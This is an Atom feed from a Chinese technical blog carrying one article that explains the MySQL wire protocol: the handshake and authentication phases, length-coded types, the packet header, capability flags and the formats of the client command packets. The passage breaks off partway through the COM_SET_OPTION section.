<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>TWO SEE</title>
  
  <subtitle>SEE is the sea of cc</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://www.twosee.cn/"/>
  <updated>2018-05-15T08:14:14.861Z</updated>
  <id>http://www.twosee.cn/</id>
  
  <author>
    <name>Twosee</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>[整理] MySQL协议分析</title>
    <link href="http://www.twosee.cn/2018/05/15/mysql-protocol/"/>
    <id>http://www.twosee.cn/2018/05/15/mysql-protocol/</id>
    <published>2018-05-15T08:05:26.000Z</published>
    <updated>2018-05-15T08:14:14.861Z</updated>
    
    <content type="html"><![CDATA[<h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><p>[TOC]</p><h2 id="1-交互过程"><a href="#1-交互过程" class="headerlink" title="1 交互过程"></a>1 交互过程</h2><p>MySQL客户端与服务器的交互主要分为两个阶段：握手认证阶段和命令执行阶段。</p><h3 id="1-1-握手认证阶段"><a href="#1-1-握手认证阶段" class="headerlink" title="1.1 握手认证阶段"></a>1.1 握手认证阶段</h3><p>握手认证阶段为客户端与服务器建立连接后进行，交互过程如下：</p><ul><li>服务器 -&gt; 客户端：握手初始化消息</li><li>客户端 -&gt; 服务器：登陆认证消息</li><li>服务器 -&gt; 客户端：认证结果消息</li></ul><h3 id="1-2-命令执行阶段"><a href="#1-2-命令执行阶段" class="headerlink" title="1.2 命令执行阶段"></a>1.2 命令执行阶段</h3><p>客户端认证成功后，会进入命令执行阶段，交互过程如下：</p><ul><li>客户端 -&gt; 服务器：执行命令消息</li><li>服务器 -&gt; 客户端：命令执行结果</li></ul><a id="more"></a><p><strong>MySQL客户端与服务器的完整交互过程如下</strong>：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://hutaow.com/images/articles/201311/mysql_protocol_message.png" alt="MySQL客户端与服务器交互示意图" title="">                </div>                <div class="image-caption">MySQL客户端与服务器交互示意图</div>            </figure><h2 id="2-基本类型"><a href="#2-基本类型" class="headerlink" title="2 基本类型"></a>2 基本类型</h2><h3 id="2-1-整型值"><a href="#2-1-整型值" class="headerlink" title="2.1 整型值"></a>2.1 整型值</h3><p>MySQL报文中整型值分别有1、2、3、4、8字节长度，使用小字节序传输。</p><h3 id="2-2-字符串（以NULL结尾）（Null-Terminated-String）"><a href="#2-2-字符串（以NULL结尾）（Null-Terminated-String）" class="headerlink" title="2.2 字符串（以NULL结尾）（Null-Terminated String）"></a>2.2 字符串（以NULL结尾）（Null-Terminated String）</h3><p>字符串长度不固定，当遇到’NULL’（0x00）字符时结束。</p><h3 id="2-3-二进制数据（长度编码）（Length-Coded-Binary）"><a href="#2-3-二进制数据（长度编码）（Length-Coded-Binary）" class="headerlink" title="2.3 二进制数据（长度编码）（Length Coded Binary）"></a>2.3 二进制数据（长度编码）（Length Coded Binary）</h3><p>数据长度不固定，长度值由数据前的1-9个字节决定，其中长度值所占的字节数不定，字节数由第1个字节决定，如下表：</p><table><thead><tr><th>第一个字节值</th><th>后续字节数</th><th>长度值说明</th></tr></thead><tbody><tr><td>0-250</td><td>0</td><td>第一个字节值即为数据的真实长度</td></tr><tr><td>251</td><td>0</td><td>空数据，数据的真实长度为零</td></tr><tr><td>252</td><td>2</td><td>后续额外2个字节标识了数据的真实长度</td></tr><tr><td>253</td><td>3</td><td>后续额外3个字节标识了数据的真实长度</td></tr><tr><td>254</td><td>8</td><td>后续额外8个字节标识了数据的真实长度</td></tr></tbody></table><h3 id="2-4-字符串（长度编码）（Length-Coded-String）"><a href="#2-4-字符串（长度编码）（Length-Coded-String）" class="headerlink" title="2.4 字符串（长度编码）（Length Coded String）"></a>2.4 字符串（长度编码）（Length Coded String）</h3><p>字符串长度不固定，无’NULL’（0x00）结束符，编码方式与上面的 Length Coded Binary 相同。</p><h2 id="3-报文结构"><a href="#3-报文结构" class="headerlink" title="3 报文结构"></a>3 报文结构</h2><p>报文分为消息头和消息体两部分，其中消息头占用固定的4个字节，消息体长度由消息头中的长度字段决定，报文结构如下：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://hutaow.com/images/articles/201311/mysql_protocol_struct.png" alt="MySQL报文结构" title="">                </div>                <div class="image-caption">MySQL报文结构</div>            </figure><h3 id="3-1-消息头"><a href="#3-1-消息头" class="headerlink" title="3.1 消息头"></a>3.1 消息头</h3><h4 id="3-1-1-报文长度"><a href="#3-1-1-报文长度" class="headerlink" title="3.1.1 报文长度"></a>3.1.1 报文长度</h4><p>用于标记当前请求消息的实际数据长度值，以字节为单位，占用3个字节，最大值为 0xFFFFFF，即接近 16 MB 大小（比16MB少1个字节）。</p><h4 id="3-1-2-序号"><a href="#3-1-2-序号" class="headerlink" title="3.1.2 序号"></a>3.1.2 序号</h4><p>在一次完整的请求/响应交互过程中，用于保证消息顺序的正确，每次客户端发起请求时，序号值都会从0开始计算。</p><h3 id="3-2-消息体"><a href="#3-2-消息体" class="headerlink" title="3.2 消息体"></a>3.2 消息体</h3><p>消息体用于存放请求的内容及响应的数据，长度由消息头中的长度值决定。</p><h2 id="4-报文类型"><a href="#4-报文类型" class="headerlink" title="4 报文类型"></a>4 报文类型</h2><h3 id="4-1-登陆认证交互报文"><a href="#4-1-登陆认证交互报文" class="headerlink" title="4.1 登陆认证交互报文"></a>4.1 登陆认证交互报文</h3><h4 id="4-1-1-握手初始化报文（服务器-gt-客户端）"><a href="#4-1-1-握手初始化报文（服务器-gt-客户端）" class="headerlink" title="4.1.1 握手初始化报文（服务器 -&gt; 客户端）"></a>4.1.1 握手初始化报文（服务器 -&gt; 客户端）</h4><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://hutaow.com/images/articles/201311/mysql_protocol_handshake.png" alt="MySQL握手初始化报文" title="">                </div>                <div class="image-caption">MySQL握手初始化报文</div>            </figure><p><strong>服务协议版本号</strong>：该值由 PROTOCOL_VERSION 宏定义决定（参考MySQL源代码<code>/include/mysql_version.h</code>头文件定义）</p><p><strong>服务版本信息</strong>：该值为字符串，由 MYSQL_SERVER_VERSION 宏定义决定（参考MySQL源代码<code>/include/mysql_version.h</code>头文件定义）</p><p><strong>服务器线程ID</strong>：服务器为当前连接所创建的线程ID。</p><p><strong>挑战随机数</strong>：MySQL数据库用户认证采用的是挑战/应答的方式，服务器生成该挑战数并发送给客户端，由客户端进行处理并返回相应结果，然后服务器检查是否与预期的结果相同，从而完成用户认证的过程。</p><p><strong>服务器权能标志</strong>：用于与客户端协商通讯方式，各标志位含义如下（参考MySQL源代码<code>/include/mysql_com.h</code>中的宏定义）：</p><table><thead><tr><th>标志位名称</th><th>标志位</th><th>说明</th></tr></thead><tbody><tr><td>CLIENT_LONG_PASSWORD</td><td>0x0001</td><td>new more secure passwords</td></tr><tr><td>CLIENT_FOUND_ROWS</td><td>0x0002</td><td>Found instead of affected rows</td></tr><tr><td>CLIENT_LONG_FLAG</td><td>0x0004</td><td>Get all column flags</td></tr><tr><td>CLIENT_CONNECT_WITH_DB</td><td>0x0008</td><td>One can specify db on connect</td></tr><tr><td>CLIENT_NO_SCHEMA</td><td>0x0010</td><td>Do not allow database.table.column</td></tr><tr><td>CLIENT_COMPRESS</td><td>0x0020</td><td>Can use compression protocol</td></tr><tr><td>CLIENT_ODBC</td><td>0x0040</td><td>Odbc client</td></tr><tr><td>CLIENT_LOCAL_FILES</td><td>0x0080</td><td>Can use LOAD DATA LOCAL</td></tr><tr><td>CLIENT_IGNORE_SPACE</td><td>0x0100</td><td>Ignore spaces before ‘(‘</td></tr><tr><td>CLIENT_PROTOCOL_41</td><td>0x0200</td><td>New 4.1 protocol</td></tr><tr><td>CLIENT_INTERACTIVE</td><td>0x0400</td><td>This is an interactive client</td></tr><tr><td>CLIENT_SSL</td><td>0x0800</td><td>Switch to SSL after handshake</td></tr><tr><td>CLIENT_IGNORE_SIGPIPE</td><td>0x1000</td><td>IGNORE sigpipes</td></tr><tr><td>CLIENT_TRANSACTIONS</td><td>0x2000</td><td>Client knows about transactions</td></tr><tr><td>CLIENT_RESERVED</td><td>0x4000</td><td>Old flag for 4.1 protocol</td></tr><tr><td>CLIENT_SECURE_CONNECTION</td><td>0x8000</td><td>New 4.1 authentication</td></tr><tr><td>CLIENT_MULTI_STATEMENTS</td><td>0x0001 0000</td><td>Enable/disable multi-stmt support</td></tr><tr><td>CLIENT_MULTI_RESULTS</td><td>0x0002 0000</td><td>Enable/disable multi-results</td></tr></tbody></table><p><strong>字符编码</strong>：标识服务器所使用的字符集。</p><p><strong>服务器状态</strong>：状态值定义如下（参考MySQL源代码<code>/include/mysql_com.h</code>中的宏定义）：</p><table><thead><tr><th>状态名称</th><th>状态值</th></tr></thead><tbody><tr><td>SERVER_STATUS_IN_TRANS</td><td>0x0001</td></tr><tr><td>SERVER_STATUS_AUTOCOMMIT</td><td>0x0002</td></tr><tr><td>SERVER_STATUS_CURSOR_EXISTS</td><td>0x0040</td></tr><tr><td>SERVER_STATUS_LAST_ROW_SENT</td><td>0x0080</td></tr><tr><td>SERVER_STATUS_DB_DROPPED</td><td>0x0100</td></tr><tr><td>SERVER_STATUS_NO_BACKSLASH_ESCAPES</td><td>0x0200</td></tr><tr><td>SERVER_STATUS_METADATA_CHANGED</td><td>0x0400</td></tr></tbody></table><h4 id="4-1-2-登陆认证报文（客户端-gt-服务器）"><a href="#4-1-2-登陆认证报文（客户端-gt-服务器）" class="headerlink" title="4.1.2 登陆认证报文（客户端 -&gt; 服务器）"></a>4.1.2 登陆认证报文（客户端 -&gt; 服务器）</h4><p><strong>MySQL 4.0 及之前的版本</strong></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://hutaow.com/images/articles/201311/mysql_protocol_auth_40.png" alt="MySQL登陆认证报文(4.0及之前的版本)" title="">                </div>                <div class="image-caption">MySQL登陆认证报文(4.0及之前的版本)</div>            </figure><p><strong>MySQL 4.1 及之后的版本</strong></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://hutaow.com/images/articles/201311/mysql_protocol_auth_41.png" alt="MySQL登陆认证报文(4.1及之后的版本)" title="">                </div>                <div class="image-caption">MySQL登陆认证报文(4.1及之后的版本)</div>            </figure><p><strong>客户端权能标志</strong>：用于与客户端协商通讯方式，标志位含义与握手初始化报文中的相同。客户端收到服务器发来的初始化报文后，会对服务器发送的权能标志进行修改，保留自身所支持的功能，然后将权能标返回给服务器，从而保证服务器与客户端通讯的兼容性。</p><p><strong>最大消息长度</strong>：客户端发送请求报文时所支持的最大消息长度值。</p><p><strong>字符编码</strong>：标识通讯过程中使用的字符编码，与服务器在认证初始化报文中发送的相同。</p><p><strong>用户名</strong>：客户端登陆用户的用户名称。</p><p><strong>挑战认证数据</strong>：客户端用户密码使用服务器发送的挑战随机数进行加密后，生成挑战认证数据，然后返回给服务器，用于对用户身份的认证。</p><p><strong>数据库名称</strong>：当客户端的权能标志位 CLIENT_CONNECT_WITH_DB 被置位时，该字段必须出现。</p><h3 id="4-2-客户端命令请求报文（客户端-gt-服务器）"><a href="#4-2-客户端命令请求报文（客户端-gt-服务器）" class="headerlink" title="4.2 客户端命令请求报文（客户端 -&gt; 服务器）"></a>4.2 客户端命令请求报文（客户端 -&gt; 服务器）</h3><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://hutaow.com/images/articles/201311/mysql_protocol_command.png" alt="MySQL客户端命令请求报文" title="">                </div>                <div class="image-caption">MySQL客户端命令请求报文</div>            </figure><p><strong>命令</strong>：用于标识当前请求消息的类型，例如切换数据库（0x02）、查询命令（0x03）等。命令值的取值范围及说明如下表（参考MySQL源代码<code>/include/mysql_com.h</code>头文件中的定义）：</p><table><thead><tr><th>类型值</th><th>命令</th><th>功能</th><th>关联函数</th></tr></thead><tbody><tr><td>0x00</td><td>COM_SLEEP</td><td>（内部线程状态）</td><td>（无）</td></tr><tr><td>0x01</td><td>COM_QUIT</td><td>关闭连接</td><td>mysql_close</td></tr><tr><td>0x02</td><td>COM_INIT_DB</td><td>切换数据库</td><td>mysql_select_db</td></tr><tr><td>0x03</td><td>COM_QUERY</td><td>SQL查询请求</td><td>mysql_real_query</td></tr><tr><td>0x04</td><td>COM_FIELD_LIST</td><td>获取数据表字段信息</td><td>mysql_list_fields</td></tr><tr><td>0x05</td><td>COM_CREATE_DB</td><td>创建数据库</td><td>mysql_create_db</td></tr><tr><td>0x06</td><td>COM_DROP_DB</td><td>删除数据库</td><td>mysql_drop_db</td></tr><tr><td>0x07</td><td>COM_REFRESH</td><td>清除缓存</td><td>mysql_refresh</td></tr><tr><td>0x08</td><td>COM_SHUTDOWN</td><td>停止服务器</td><td>mysql_shutdown</td></tr><tr><td>0x09</td><td>COM_STATISTICS</td><td>获取服务器统计信息</td><td>mysql_stat</td></tr><tr><td>0x0A</td><td>COM_PROCESS_INFO</td><td>获取当前连接的列表</td><td>mysql_list_processes</td></tr><tr><td>0x0B</td><td>COM_CONNECT</td><td>（内部线程状态）</td><td>（无）</td></tr><tr><td>0x0C</td><td>COM_PROCESS_KILL</td><td>中断某个连接</td><td>mysql_kill</td></tr><tr><td>0x0D</td><td>COM_DEBUG</td><td>保存服务器调试信息</td><td>mysql_dump_debug_info</td></tr><tr><td>0x0E</td><td>COM_PING</td><td>测试连通性</td><td>mysql_ping</td></tr><tr><td>0x0F</td><td>COM_TIME</td><td>（内部线程状态）</td><td>（无）</td></tr><tr><td>0x10</td><td>COM_DELAYED_INSERT</td><td>（内部线程状态）</td><td>（无）</td></tr><tr><td>0x11</td><td>COM_CHANGE_USER</td><td>重新登陆（不断连接）</td><td>mysql_change_user</td></tr><tr><td>0x12</td><td>COM_BINLOG_DUMP</td><td>获取二进制日志信息</td><td>（无）</td></tr><tr><td>0x13</td><td>COM_TABLE_DUMP</td><td>获取数据表结构信息</td><td>（无）</td></tr><tr><td>0x14</td><td>COM_CONNECT_OUT</td><td>（内部线程状态）</td><td>（无）</td></tr><tr><td>0x15</td><td>COM_REGISTER_SLAVE</td><td>从服务器向主服务器进行注册</td><td>（无）</td></tr><tr><td>0x16</td><td>COM_STMT_PREPARE</td><td>预处理SQL语句</td><td>mysql_stmt_prepare</td></tr><tr><td>0x17</td><td>COM_STMT_EXECUTE</td><td>执行预处理语句</td><td>mysql_stmt_execute</td></tr><tr><td>0x18</td><td>COM_STMT_SEND_LONG_DATA</td><td>发送BLOB类型的数据</td><td>mysql_stmt_send_long_data</td></tr><tr><td>0x19</td><td>COM_STMT_CLOSE</td><td>销毁预处理语句</td><td>mysql_stmt_close</td></tr><tr><td>0x1A</td><td>COM_STMT_RESET</td><td>清除预处理语句参数缓存</td><td>mysql_stmt_reset</td></tr><tr><td>0x1B</td><td>COM_SET_OPTION</td><td>设置语句选项</td><td>mysql_set_server_option</td></tr><tr><td>0x1C</td><td>COM_STMT_FETCH</td><td>获取预处理语句的执行结果</td><td>mysql_stmt_fetch</td></tr></tbody></table><p><strong>参数</strong>：内容是用户在MySQL客户端输入的命令（不包括每行命令结尾的”;”分号）。另外这个字段的字符串不是以NULL字符结尾，而是通过消息头中的长度值计算而来。</p><p>例如：当我们在MySQL客户端中执行<code>use hutaow;</code>命令时（切换到<code>hutaow</code>数据库），发送的请求报文数据会是下面的样子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x02 0x68 0x75 0x74 0x61 0x6f 0x77</span><br></pre></td></tr></table></figure><p>其中，<code>0x02</code>为请求类型值<code>COM_INIT_DB</code>，后面的<code>0x68 0x75 0x74 0x61 0x6f 0x77</code>为ASCII字符<code>hutaow</code>。</p><h4 id="4-2-1-COM-QUIT-消息报文"><a href="#4-2-1-COM-QUIT-消息报文" class="headerlink" title="4.2.1 COM_QUIT 消息报文"></a>4.2.1 COM_QUIT 消息报文</h4><p><strong>功能</strong>：关闭当前连接（客户端退出），无参数。</p><h4 id="4-2-2-COM-INIT-DB-消息报文"><a href="#4-2-2-COM-INIT-DB-消息报文" class="headerlink" title="4.2.2 COM_INIT_DB 消息报文"></a>4.2.2 COM_INIT_DB 消息报文</h4><p><strong>功能</strong>：切换数据库，对应的SQL语句为<code>USE &lt;database&gt;</code>。</p><table><thead><tr><th>字节</th><th>说明</th></tr></thead><tbody><tr><td>n</td><td>数据库名称（字符串到达消息尾部时结束，无结束符）</td></tr></tbody></table><h4 id="4-2-3-COM-QUERY-消息报文"><a href="#4-2-3-COM-QUERY-消息报文" class="headerlink" title="4.2.3 COM_QUERY 消息报文"></a>4.2.3 COM_QUERY 消息报文</h4><p><strong>功能</strong>：最常见的请求消息类型，当用户执行SQL语句时发送该消息。</p><table><thead><tr><th>字节</th><th>说明</th></tr></thead><tbody><tr><td>n</td><td>SQL语句（字符串到达消息尾部时结束，无结束符）</td></tr></tbody></table><h4 id="4-2-4-COM-FIELD-LIST-消息报文"><a href="#4-2-4-COM-FIELD-LIST-消息报文" class="headerlink" title="4.2.4 COM_FIELD_LIST 消息报文"></a>4.2.4 COM_FIELD_LIST 消息报文</h4><p><strong>功能</strong>：查询某表的字段（列）信息，等同于SQL语句<code>SHOW [FULL] FIELDS FROM ...</code>。</p><table><thead><tr><th>字节</th><th>说明</th></tr></thead><tbody><tr><td>n</td><td>表格名称（Null-Terminated String）</td></tr><tr><td>n</td><td>字段（列）名称或通配符（可选）</td></tr></tbody></table><h4 id="4-2-5-COM-CREATE-DB-消息报文"><a href="#4-2-5-COM-CREATE-DB-消息报文" class="headerlink" title="4.2.5 COM_CREATE_DB 消息报文"></a>4.2.5 COM_CREATE_DB 消息报文</h4><p><strong>功能</strong>：创建数据库，该消息已过时，而被SQL语句<code>CREATE DATABASE</code>代替。</p><table><thead><tr><th>字节</th><th>说明</th></tr></thead><tbody><tr><td>n</td><td>数据库名称（字符串到达消息尾部时结束，无结束符）</td></tr></tbody></table><h4 id="4-2-6-COM-DROP-DB-消息报文"><a href="#4-2-6-COM-DROP-DB-消息报文" class="headerlink" title="4.2.6 COM_DROP_DB 消息报文"></a>4.2.6 COM_DROP_DB 消息报文</h4><p><strong>功能</strong>：删除数据库，该消息已过时，而被SQL语句<code>DROP DATABASE</code>代替。</p><table><thead><tr><th>字节</th><th>说明</th></tr></thead><tbody><tr><td>n</td><td>数据库名称（字符串到达消息尾部时结束，无结束符）</td></tr></tbody></table><h4 id="4-2-7-COM-REFRESH-消息报文"><a href="#4-2-7-COM-REFRESH-消息报文" class="headerlink" title="4.2.7 COM_REFRESH 消息报文"></a>4.2.7 COM_REFRESH 消息报文</h4><p><strong>功能</strong>：清除缓存，等同于SQL语句<code>FLUSH</code>，或是执行<code>mysqladmin flush-foo</code>命令时发送该消息。</p><table><thead><tr><th>字节</th><th>说明</th></tr></thead><tbody><tr><td>1</td><td>清除缓存选项（位图方式存储，各标志位含义如下）</td></tr><tr><td></td><td>0x01: REFRESH_GRANT</td></tr><tr><td></td><td>0x02: REFRESH_LOG</td></tr><tr><td></td><td>0x04: REFRESH_TABLES</td></tr><tr><td></td><td>0x08: REFRESH_HOSTS</td></tr><tr><td></td><td>0x10: REFRESH_STATUS</td></tr><tr><td></td><td>0x20: REFRESH_THREADS</td></tr><tr><td></td><td>0x40: REFRESH_SLAVE</td></tr><tr><td></td><td>0x80: REFRESH_MASTER</td></tr></tbody></table><h4 id="4-2-8-COM-SHUTDOWN-消息报文"><a href="#4-2-8-COM-SHUTDOWN-消息报文" class="headerlink" title="4.2.8 COM_SHUTDOWN 消息报文"></a>4.2.8 COM_SHUTDOWN 消息报文</h4><p><strong>功能</strong>：停止MySQL服务。执行<code>mysqladmin shutdown</code>命令时发送该消息。</p><table><thead><tr><th>字节</th><th>说明</th></tr></thead><tbody><tr><td>1</td><td>停止服务选项</td></tr><tr><td></td><td>0x00: SHUTDOWN_DEFAULT</td></tr><tr><td></td><td>0x01: SHUTDOWN_WAIT_CONNECTIONS</td></tr><tr><td></td><td>0x02: SHUTDOWN_WAIT_TRANSACTIONS</td></tr><tr><td></td><td>0x08: SHUTDOWN_WAIT_UPDATES</td></tr><tr><td></td><td>0x10: SHUTDOWN_WAIT_ALL_BUFFERS</td></tr><tr><td></td><td>0x11: SHUTDOWN_WAIT_CRITICAL_BUFFERS</td></tr><tr><td></td><td>0xFE: KILL_QUERY</td></tr><tr><td></td><td>0xFF: KILL_CONNECTION</td></tr></tbody></table><h4 id="4-2-9-COM-STATISTICS-消息报文"><a href="#4-2-9-COM-STATISTICS-消息报文" class="headerlink" title="4.2.9 COM_STATISTICS 消息报文"></a>4.2.9 COM_STATISTICS 消息报文</h4><p><strong>功能</strong>：查看MySQL服务的统计信息（例如运行时间、每秒查询次数等）。执行<code>mysqladmin status</code>命令时发送该消息，无参数。</p><h4 id="4-2-10-COM-PROCESS-INFO-消息报文"><a href="#4-2-10-COM-PROCESS-INFO-消息报文" class="headerlink" title="4.2.10 COM_PROCESS_INFO 消息报文"></a>4.2.10 COM_PROCESS_INFO 消息报文</h4><p><strong>功能</strong>：获取当前活动的线程（连接）列表。等同于SQL语句<code>SHOW PROCESSLIST</code>，或是执行<code>mysqladmin processlist</code>命令时发送该消息，无参数。</p><h4 id="4-2-11-COM-PROCESS-KILL-消息报文"><a href="#4-2-11-COM-PROCESS-KILL-消息报文" class="headerlink" title="4.2.11 COM_PROCESS_KILL 消息报文"></a>4.2.11 COM_PROCESS_KILL 消息报文</h4><p><strong>功能</strong>：要求服务器中断某个连接。等同于SQL语句<code>KILL &lt;id&gt;</code>。</p><table><thead><tr><th>字节</th><th>说明</th></tr></thead><tbody><tr><td>4</td><td>连接ID号（小字节序）</td></tr></tbody></table><h4 id="4-2-12-COM-DEBUG-消息报文"><a href="#4-2-12-COM-DEBUG-消息报文" class="headerlink" title="4.2.12 COM_DEBUG 消息报文"></a>4.2.12 COM_DEBUG 消息报文</h4><p><strong>功能</strong>：要求服务器将调试信息保存下来，保存的信息多少依赖于编译选项设置（debug=no|yes|full）。执行<code>mysqladmin debug</code>命令时发送该消息，无参数。</p><h4 id="4-2-13-COM-PING-消息报文"><a href="#4-2-13-COM-PING-消息报文" class="headerlink" title="4.2.13 COM_PING 消息报文"></a>4.2.13 COM_PING 消息报文</h4><p><strong>功能</strong>：该消息用来测试连通性，同时会将服务器的无效连接（超时）计数器清零。执行<code>mysqladmin ping</code>命令时发送该消息，无参数。</p><h4 id="4-2-14-COM-CHANGE-USER-消息报文"><a href="#4-2-14-COM-CHANGE-USER-消息报文" class="headerlink" title="4.2.14 COM_CHANGE_USER 消息报文"></a>4.2.14 COM_CHANGE_USER 消息报文</h4><p><strong>功能</strong>：在不断连接的情况下重新登陆，该操作会销毁MySQL服务器端的会话上下文（包括临时表、会话变量等）。有些连接池用这种方法实现清除会话上下文。</p><table><thead><tr><th>字节</th><th>说明</th></tr></thead><tbody><tr><td>n</td><td>用户名（字符串以NULL结尾）</td></tr><tr><td>n</td><td>密码（挑战数）</td></tr><tr><td></td><td>MySQL 3.23 版本：Null-Terminated String（长度9字节）</td></tr><tr><td></td><td>MySQL 4.1 版本：Length Coded String（长度1+21字节）</td></tr><tr><td>n</td><td>数据库名称（Null-Terminated String）</td></tr><tr><td>2</td><td>字符编码</td></tr></tbody></table><h4 id="4-2-15-COM-BINLOG-DUMP-消息报文"><a href="#4-2-15-COM-BINLOG-DUMP-消息报文" class="headerlink" title="4.2.15 COM_BINLOG_DUMP 消息报文"></a>4.2.15 COM_BINLOG_DUMP 消息报文</h4><p><strong>功能</strong>：该消息是备份连接时由从服务器向主服务器发送的最后一个请求，主服务器收到后，会响应一系列的报文，每个报文都包含一个二进制日志事件。如果主服务器出现故障时，会发送一个EOF报文。</p><table><thead><tr><th>字节</th><th>说明</th></tr></thead><tbody><tr><td>4</td><td>二进制日志数据的起始位置（小字节序）</td></tr><tr><td>4</td><td>二进制日志数据标志位（目前未使用，永远为0x00）</td></tr><tr><td>4</td><td>从服务器的服务器ID值（小字节序）</td></tr><tr><td>n</td><td>二进制日志的文件名称（可选，默认值为主服务器上第一个有效的文件名）</td></tr></tbody></table><h4 id="4-2-16-COM-TABLE-DUMP-消息报文"><a href="#4-2-16-COM-TABLE-DUMP-消息报文" class="headerlink" title="4.2.16 COM_TABLE_DUMP 消息报文"></a>4.2.16 COM_TABLE_DUMP 消息报文</h4><p><strong>功能</strong>：将数据表从主服务器复制到从服务器中，执行SQL语句<code>LOAD TABLE ... FROM MASTER</code>时发送该消息。目前该消息已过时，不再使用。</p><table><thead><tr><th>字节</th><th>说明</th></tr></thead><tbody><tr><td>n</td><td>数据库名称（Length Coded String）</td></tr><tr><td>n</td><td>数据表名称（Length Coded String）</td></tr></tbody></table><h4 id="4-2-17-COM-REGISTER-SLAVE-消息报文"><a href="#4-2-17-COM-REGISTER-SLAVE-消息报文" class="headerlink" title="4.2.17 COM_REGISTER_SLAVE 消息报文"></a>4.2.17 COM_REGISTER_SLAVE 消息报文</h4><p><strong>功能</strong>：在从服务器<code>report_host</code>变量设置的情况下，当备份连接时向主服务器发送的注册消息。</p><table><thead><tr><th>字节</th><th>说明</th></tr></thead><tbody><tr><td>4</td><td>从服务器ID值（小字节序）</td></tr><tr><td>n</td><td>主服务器IP地址（Length Coded String）</td></tr><tr><td>n</td><td>主服务器用户名（Length Coded String）</td></tr><tr><td>n</td><td>主服务器密码（Length Coded String）</td></tr><tr><td>2</td><td>主服务器端口号</td></tr><tr><td>4</td><td>安全备份级别（由MySQL服务器<code>rpl_recovery_rank</code>变量设置，暂时未使用）</td></tr><tr><td>4</td><td>主服务器ID值（值恒为0x00）</td></tr></tbody></table><h4 id="4-2-18-COM-PREPARE-消息报文"><a href="#4-2-18-COM-PREPARE-消息报文" class="headerlink" title="4.2.18 COM_PREPARE 消息报文"></a>4.2.18 COM_PREPARE 消息报文</h4><p><strong>功能</strong>：预处理SQL语句，使用带有”?”占位符的SQL语句时发送该消息。</p><table><thead><tr><th>字节</th><th>说明</th></tr></thead><tbody><tr><td>n</td><td>带有”?”占位符的SQL语句（字符串到达消息尾部时结束，无结束符）</td></tr></tbody></table><h4 id="4-2-19-COM-EXECUTE-消息报文"><a href="#4-2-19-COM-EXECUTE-消息报文" class="headerlink" title="4.2.19 COM_EXECUTE 消息报文"></a>4.2.19 COM_EXECUTE 消息报文</h4><p><strong>功能</strong>：执行预处理语句。</p><table><thead><tr><th>字节</th><th>说明</th></tr></thead><tbody><tr><td>4</td><td>预处理语句的ID值</td></tr><tr><td>1</td><td>标志位</td></tr><tr><td></td><td>0x00: CURSOR_TYPE_NO_CURSOR</td></tr><tr><td></td><td>0x01: CURSOR_TYPE_READ_ONLY</td></tr><tr><td></td><td>0x02: CURSOR_TYPE_FOR_UPDATE</td></tr><tr><td></td><td>0x04: CURSOR_TYPE_SCROLLABLE</td></tr><tr><td>4</td><td>保留（值恒为0x01）</td></tr><tr><td>如果参数数量大于0</td><td></td></tr><tr><td>n</td><td>空位图（Null-Bitmap，长度 = (参数数量 + 7) / 8 字节）</td></tr><tr><td>1</td><td>参数分隔标志</td></tr><tr><td>如果参数分隔标志值为1</td><td></td></tr><tr><td>n</td><td>每个参数的类型值（长度 = 参数数量 * 2 字节）</td></tr><tr><td>n</td><td>每个参数的值</td></tr></tbody></table><h4 id="4-2-20-COM-LONG-DATA-消息报文"><a href="#4-2-20-COM-LONG-DATA-消息报文" class="headerlink" title="4.2.20 COM_LONG_DATA 消息报文"></a>4.2.20 COM_LONG_DATA 消息报文</h4><p>该消息报文有两种形式，一种用于发送二进制数据，另一种用于发送文本数据。</p><p><strong>功能</strong>：用于发送二进制（BLOB）类型的数据（调用<code>mysql_stmt_send_long_data</code>函数）。</p><table><thead><tr><th>字节</th><th>说明</th></tr></thead><tbody><tr><td>4</td><td>预处理语句的ID值（小字节序）</td></tr><tr><td>2</td><td>参数序号（小字节序）</td></tr><tr><td>n</td><td>数据负载（数据到达消息尾部时结束，无结束符）</td></tr></tbody></table><p><strong>功能</strong>：用于发送超长字符串类型的数据（调用<code>mysql_send_long_data</code>函数）</p><table><thead><tr><th>字节</th><th>说明</th></tr></thead><tbody><tr><td>4</td><td>预处理语句的ID值（小字节序）</td></tr><tr><td>2</td><td>参数序号（小字节序）</td></tr><tr><td>2</td><td>数据类型（未使用）</td></tr><tr><td>n</td><td>数据负载（数据到达消息尾部时结束，无结束符）</td></tr></tbody></table><h4 id="4-2-21-COM-CLOSE-STMT-消息报文"><a href="#4-2-21-COM-CLOSE-STMT-消息报文" class="headerlink" title="4.2.21 COM_CLOSE_STMT 消息报文"></a>4.2.21 COM_CLOSE_STMT 消息报文</h4><p><strong>功能</strong>：销毁预处理语句。</p><table><thead><tr><th>字节</th><th>说明</th></tr></thead><tbody><tr><td>4</td><td>预处理语句的ID值（小字节序）</td></tr></tbody></table><h4 id="4-2-22-COM-RESET-STMT-消息报文"><a href="#4-2-22-COM-RESET-STMT-消息报文" class="headerlink" title="4.2.22 COM_RESET_STMT 消息报文"></a>4.2.22 COM_RESET_STMT 消息报文</h4><p><strong>功能</strong>：将预处理语句的参数缓存清空。多数情况和<code>COM_LONG_DATA</code>一起使用。</p><table><thead><tr><th>字节</th><th>说明</th></tr></thead><tbody><tr><td>4</td><td>预处理语句的ID值（小字节序）</td></tr></tbody></table><h4 id="4-2-23-COM-SET-OPTION-消息报文"><a href="#4-2-23-COM-SET-OPTION-消息报文" class="headerlink" title="4.2.23 COM_SET_OPTION 消息报文"></a>4.2.23 COM_SET_OPTION 